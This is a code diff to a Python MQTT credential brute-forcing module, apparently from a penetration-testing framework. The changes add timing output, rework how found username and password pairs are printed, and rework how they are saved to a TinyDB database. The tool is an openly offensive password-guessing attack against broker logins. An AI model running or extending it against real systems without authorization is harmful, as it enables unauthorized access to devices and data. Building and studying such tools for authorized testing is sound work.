@@ -1,12 +1,14 @@
 import argparse
 import sys
 import threading
+from datetime import datetime
 from pathlib import Path
 from random import randint
 import paho.mqtt.client as mqtt
 from time import sleep
-from tinydb import TinyDB, Query
+from tinydb import TinyDB
 from cmd2 import with_argparser, with_category
+from timebudget import timebudget
 
 from framework.src.interfaces import InterfaceMixin
 
@@ -67,52 +69,66 @@ class CredentialsBruteforceMixin(InterfaceMixin):
             self.print_error(
                 'Both username string and dictionary of usernames is set, performing combinations with username')
 
-        if args.username is not None:
-            self.print_info('DETAILS' +
-                            '\nTARGET => ' + args.target +
-                            '\nPORT => ' + str(args.port) +
-                            '\nTHREADS => ' + str(args.nThreads) +
-                            '\nUSERNAME => ' + args.username +
-                            '\nDICTIONARY => ' + args.dict_password)
+        start_time = datetime.now().strftime("%A,%d %b - %H:%M:%S")
 
-            with open(Path(args.dict_password)) as f:
-                len_psw_dict = sum(1 for _ in f)
+        with timebudget("     > Your search for credentials"):
+            if args.username is not None:
+                self.print_info('DETAILS' +
+                                '\nTARGET => ' + args.target +
+                                '\nPORT => ' + str(args.port) +
+                                '\nTHREADS => ' + str(args.nThreads) +
+                                '\nUSERNAME => ' + args.username +
+                                '\nDICTIONARY => ' + args.dict_password +
+                                '\nSTARTING TIME ==> ' + str(start_time))
 
-            self.print_ok('Parsed %d passwords from %s' % (len_psw_dict, args.dict_password))
+                with open(Path(args.dict_password)) as f:
+                    len_psw_dict = sum(1 for _ in f)
 
-            self.execute_on_passwords(args.username, args.dict_password, args.target, args.port, args.nThreads,
-                                      len_psw_dict)
+                self.print_ok('Parsed %d passwords from %s' % (len_psw_dict, args.dict_password))
 
-        if args.username is None:
-            self.print_info('DETAILS'
-                            '\nTARGET => ' + args.target +
-                            '\nPORT => ' + str(args.port) +
-                            '\nTHREADS => ' + str(args.nThreads) +
-                            '\nDICTIONARIES => ' + args.dict_password + ' && ' + args.dict_username)
+                self.execute_on_passwords(args.username, args.dict_password, args.target, args.port, args.nThreads,
+                                          len_psw_dict, 1)
 
-            with open(Path(args.dict_username)) as f:
-                len_usr_dict = sum(1 for _ in f)
+            if args.username is None:
+                self.print_info('DETAILS'
+                                '\nTARGET => ' + args.target +
+                                '\nPORT => ' + str(args.port) +
+                                '\nTHREADS => ' + str(args.nThreads) +
+                                '\nDICTIONARIES => ' + args.dict_password + ' && ' + args.dict_username +
+                                '\nSTARTING TIME ==> ' + str(start_time))
 
-            self.print_ok('Parsed %d usernames from %s' % (len_usr_dict, args.dict_username))
+                with open(Path(args.dict_username)) as f:
+                    len_usr_dict = sum(1 for _ in f)
 
-            with open(Path(args.dict_password)) as f:
-                len_psw_dict = sum(1 for _ in f)
+                self.print_ok('Parsed %d usernames from %s' % (len_usr_dict, args.dict_username))
 
-            self.print_ok('Parsed %d passwords from %s' % (len_psw_dict, args.dict_password))
-            usrnmList_total = 0
+                with open(Path(args.dict_password)) as f:
+                    len_psw_dict = sum(1 for _ in f)
 
-            self.print_info('Begin execution bruteforcing credentials')
-            with open(Path(args.dict_username)) as usrnm_file:
-                for username in usrnm_file:
-                    if comb_found:
-                        break
-                    self.execute_on_passwords(username, args.dict_password, args.target, args.port, args.nThreads,
-                                              len_psw_dict)
-                    usrnmList_total += 1
-                    sys.stdout.write(' >> %d/%d USERNAMES\r' % (usrnmList_total, len_usr_dict))
-                    sys.stdout.flush()
+                self.print_ok('Parsed %d passwords from %s' % (len_psw_dict, args.dict_password))
+                usrnmList_total = 0
 
-    def execute_on_passwords(self, username, wordlist, target, port, nThreads, lenWordlist):
+                self.print_info('Begin execution bruteforcing credentials')
+                with open(Path(args.dict_username)) as usrnm_file:
+                    for username in usrnm_file:
+                        if comb_found:
+                            break
+                        self.execute_on_passwords(username, args.dict_password, args.target, args.port, args.nThreads,
+                                                  len_psw_dict, usrnmList_total)
+                        usrnmList_total += 1
+                        sys.stdout.write(' >> %d/%d USERNAMES\r' % (usrnmList_total, len_usr_dict))
+                        sys.stdout.flush()
+
+        self.print_question(
+            f"Type \\s to add the credentials to the database for the selected target, anythinge else to quit")
+        ans = input(f"Input: ")
+        if ans == '\\s':
+            self.db.update({'credentials': {'username': username_found, 'password': password_found}},
+                           doc_ids=[(len(self.db))])
+            self.print_ok(f"Target credentials updated")
+        self.print_info('Quitted from Bruteforcer')
+
+    def execute_on_passwords(self, username, wordlist, target, port, nThreads, lenWordlist, usrs_scanned):
         thread_counter = 0
         i = 1
         wList_counter = 1
@@ -156,15 +172,8 @@ class CredentialsBruteforceMixin(InterfaceMixin):
         if not comb_found:
             self.print_error("Bad luck! No username - password combination has been found.")
         else:
-            self.print_ok('After %d attempts a successful combination has been found!' % wList_total)
-            self.print_question(
-                f"Type \\s to add the credentials to the database for the selected target")
-            ans = input(f"Input: ")
-            if ans == '\\s':
-                # TODO: FIX INSERTION IN DATABASE
-                self.db.update({'username': username_found, 'password': password_found}, Query().doc_id == len(self.db))
-                self.print_ok(f"Target credentials updated")
-            self.print_info('Quitted from Bruteforcer')
+            self.print_ok('After %d attempts a successful combination has been found!' % (wList_total + usrs_scanned))
+            self.print_ok(' > USERNAME: %s - PASSWORD: %s\r' % (username_found, password_found))
 
 
 class PswCracker(threading.Thread):
@@ -198,7 +207,6 @@ class PswCracker(threading.Thread):
             except:
                 pass
             if self.p_id:
-                print(' > USERNAME: %s - PASSWORD: %s\r' % (self.target_username, passwd))
                 username_found = self.target_username
                 password_found = passwd
                 comb_found = True
